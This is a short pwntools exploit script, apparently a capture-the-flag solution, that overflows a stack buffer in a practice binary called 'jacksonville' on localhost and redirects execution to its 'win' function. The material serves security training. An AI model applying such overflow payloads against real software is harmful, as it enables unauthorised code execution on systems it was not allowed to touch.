from pwn import *

exe = ELF('.build/jacksonville')
context.binary = exe

#p = process('.build/jacksonville')

p = remote('localhost', 25602)

#p = gdb.debug('.build/jacksonville', gdbscript="b * 0x00000000004012d6")

p.recvuntil(b'> ')

payload = b'A' * 6 + b'Jaguars\x00'
payload += b'A' * (0x68 - len(payload))
payload += p64(0x40101a) + p64(exe.sym['win'])

p.sendline(payload)

p.interactive() 
